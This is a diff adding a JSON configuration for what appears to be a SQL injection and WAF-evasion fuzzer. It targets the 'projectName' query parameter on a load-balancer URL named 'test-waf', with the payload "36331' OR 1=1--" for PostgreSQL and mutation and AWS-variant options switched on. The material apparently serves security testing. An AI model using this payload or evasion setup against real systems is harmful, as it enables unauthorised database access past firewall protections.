@@ -1,0 +1,25 @@
+{
+  "base_url": "http://test-waf-949142697.us-east-1.elb.amazonaws.com/projects",
+  "inject_mode": "query",
+  "query_param": "projectName",
+  "raw_payload": "36331' OR 1=1--",
+  "sql_dialect": "postgresql",
+  "id_remap": { "from": "36331", "to": "Demo_project" },
+  "id_remap_legacy": [
+    { "from": "Project 1", "to": "Demo_project" },
+    { "from": "Project+1", "to": "Demo_project" }
+  ],
+  "sleep_seconds": 0.15,
+  "repeat_per_variant": 1,
+  "max_requests": null,
+  "probe_mode": "variants",
+  "max_generations": 5,
+  "calibration": true,
+  "aws_extra_variants": true,
+  "aws_extra_max": 120,
+  "adv_mutate_enabled": true,
+  "adv_mutate_max": 80,
+  "adv_second_layer": true,
+  "adv_second_layer_max": 50,
+  "extra_headers": {}
+}
